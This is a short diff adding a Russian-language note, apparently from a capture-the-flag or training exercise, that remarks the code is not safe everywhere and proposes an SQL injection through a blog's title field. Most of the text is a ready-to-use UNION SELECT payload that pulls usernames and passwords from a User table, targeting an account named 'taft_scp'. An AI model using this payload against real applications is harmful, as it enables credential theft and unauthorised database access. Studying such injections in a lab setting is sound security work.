@@ -1,0 +1,3 @@
+Можно заметить, что код не везде безопасный. Предлагаю использовать sql инъекцию. 
+Написать её можно в названии блога
+' UNION SELECT username, password FROM User where username = 'taft_scp' or '1' = '1
